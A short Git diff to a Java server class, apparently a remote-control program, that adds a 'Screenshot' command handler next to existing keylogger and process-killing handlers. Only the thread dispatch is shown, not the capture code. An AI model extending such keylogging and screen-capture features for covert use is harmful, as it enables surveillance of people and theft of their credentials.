@@ -29,6 +29,13 @@ public class Server implements SendRecv {
                 Thread killPA = new Thread(new HandleStopPAMenu());
                 killPA.start();
             }
+
+            if (option.equals("Screenshot")) {
+//                Call Server.Screenshot in other threat
+                Thread screenshot = new Thread(new HandleScreenShot());
+                screenshot.start();
+            }
+
             if (option.equals("Key")) {
 //                Call Server.KeyLogger in other threat
                 Thread keyLogger = new Thread(new HandleKeyLogger());
